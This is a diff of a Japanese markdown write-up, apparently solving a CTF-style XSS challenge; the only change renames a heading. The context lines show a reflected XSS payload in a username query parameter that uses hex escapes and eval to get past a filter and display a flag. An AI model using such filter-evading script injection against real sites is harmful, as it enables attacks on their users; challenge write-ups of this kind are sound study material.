@@ -42,7 +42,7 @@ this["\x61lert"](this["fl\x61g"]);
 
 代わりに `eval` を使いました。
 
-## 回答に使用した入力
+## 解答に使用した入力
 
 ```
 ?username=<script>this["\x61lert"](eval("fl\x61g"))</script>
